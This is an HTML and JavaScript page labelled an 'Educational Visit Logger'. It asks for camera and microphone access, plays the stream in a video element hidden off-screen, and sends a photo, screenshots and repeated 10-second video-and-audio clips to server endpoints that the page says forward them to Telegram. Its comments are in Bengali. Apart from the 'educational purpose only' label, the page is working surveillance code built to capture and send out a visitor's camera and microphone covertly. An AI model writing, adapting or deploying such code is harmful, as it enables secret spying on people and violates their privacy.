<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Educational Logger</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    body { text-align: center; margin-top: 100px; font-family: Arial, sans-serif; background: #f8f9fa; color: #333; }
    h2 { color: #222; }
    p { max-width: 700px; margin: 20px auto; color: #555; }
    button { padding: 14px 40px; margin: 15px 12px; font-size: 18px; cursor: pointer; border: none; border-radius: 8px; color: white; }
    button.primary { background: #28a745; }
    button.primary:hover { background: #218838; }
    button.stop { background: #dc3545; }
    button.stop:hover { background: #c82333; }
    button:disabled { opacity: 0.6; cursor: not-allowed; }
    #status { font-size: 15px; color: #666; margin: 25px; min-height: 24px; }
    #hiddenVideo { display: none; position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; }
  </style>
</head>
<body>

  <h2>Educational Visit Logger</h2>
  <p>Educational purpose only — actions sent to Telegram.</p>

  <button class="primary" onclick="sendData()">I Agree & Send Info</button>
  <button class="primary" onclick="captureAndSendScreenshot()">Take Screenshot & Send 📸</button>

  <br><br>

  <button class="primary" id="startBtn" onclick="startVideoBurst()">
    Start Hidden Video + Audio Sending (10s clips every 10s)
  </button>

  <button class="stop" id="stopBtn" onclick="stopVideoBurst()" style="display:none;">
    Stop Sending
  </button>

  <div id="status"></div>

  <video id="hiddenVideo" autoplay playsinline muted></video>

  <script>
    async function sendData() {
      try {
        const res = await fetch("/api/send", { method: "POST" });
        const data = await res.json();
        alert(data.success ? "Sent ✅" : "Failed ❌");
      } catch {}
    }

    async function captureAndSendScreenshot() {
      try {
        const canvas = await html2canvas(document.body, { scale: 2 });
        const base64 = canvas.toDataURL("image/png");
        await fetch("/api/send-screenshot", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });
        status.textContent = "Screenshot sent";
      } catch {}
    }

    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const status = document.getElementById('status');
    let stream = null;
    let videoEl = document.getElementById('hiddenVideo');
    let recorder = null;
    let intervalId = null;

    async function startVideoBurst() {
      if (intervalId) return;

      startBtn.disabled = true;
      startBtn.textContent = "Starting...";

      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
          audio: true   // ← এখানে অডিও চালু করা হলো (মাইক্রোফোন সাউন্ড রেকর্ড হবে)
        });

        videoEl.srcObject = stream;

        await new Promise((resolve, reject) => {
          videoEl.onloadedmetadata = () => videoEl.play().then(resolve).catch(reject);
          videoEl.onerror = reject;
          setTimeout(() => reject(new Error("Timeout")), 3000);
        });

        status.textContent = "Hidden mode active (with audio)";

        startBtn.style.display = 'none';
        stopBtn.style.display = 'inline-block';

        // প্রথম ছবি super fast
        await sendOnePhoto();

        // প্রতি ১০ সেকেন্ডে ১০ সেকেন্ডের ভিডিও + অডিও
        intervalId = setInterval(start10sVideoRecord, 10000);

      } catch (err) {
        status.textContent = "Camera/Microphone access failed";
        console.error(err);
        resetUI();
      }
    }

    async function sendOnePhoto() {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = videoEl.videoWidth;
        canvas.height = videoEl.videoHeight;
        canvas.getContext('2d').drawImage(videoEl, 0, 0);
        const base64 = canvas.toDataURL('image/png');

        await fetch("/api/send-photo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: base64 })
        });

        status.textContent = "First photo sent • starting 10s video clips";
      } catch {}
    }

    function start10sVideoRecord() {
      if (!stream) return;

      const chunks = [];
      recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });  // vp9 + opus = ভালো কোয়ালিটি + অডিও

      recorder.ondataavailable = e => chunks.push(e.data);

      recorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });

        const formData = new FormData();
        formData.append('video', blob, '10s_clip.webm');

        try {
          await fetch("/api/send-video", {
            method: "POST",
            body: formData
          });
          status.textContent = "10s video + audio sent • next in 10s";
        } catch (err) {
          status.textContent = "Video send error";
          console.error(err);
        }
      };

      recorder.start();
      setTimeout(() => {
        if (recorder.state === 'recording') recorder.stop();
      }, 10000); // ১০ সেকেন্ড পর স্টপ
    }

    function stopVideoBurst() {
      if (intervalId) clearInterval(intervalId);
      if (recorder && recorder.state !== 'inactive') recorder.stop();
      if (stream) {
        stream.getTracks().forEach(t => t.stop());
        stream = null;
      }
      videoEl.srcObject = null;

      status.textContent = "Stopped";
      resetUI();
    }

    function resetUI() {
      startBtn.disabled = false;
      startBtn.textContent = "Start Hidden Video + Audio Sending (10s clips every 10s)";
      startBtn.style.display = 'inline-block';
      stopBtn.style.display = 'none';
    }
  </script>
</body>
</html>
